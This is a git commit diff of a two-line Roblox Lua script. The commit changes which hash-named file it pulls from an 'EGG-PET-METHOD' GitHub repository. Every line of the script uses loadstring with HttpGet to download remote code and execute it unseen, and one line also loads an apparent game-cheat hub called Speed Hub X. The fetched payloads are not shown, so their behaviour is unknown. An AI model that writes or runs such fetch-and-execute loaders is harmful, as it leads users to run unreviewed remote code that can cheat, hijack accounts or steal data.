c78077524fc331b11f81edd392b516927409f2b2
muzammil909900 <143308858+muzammil909900@users.noreply.github.com>
2025-06-29 10:44:46 +0500

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/351d51bdaaa9c7ef38c715a8330fc4dd.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/e000dcbd121c14d805b7c7689d79e8cd.txt"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
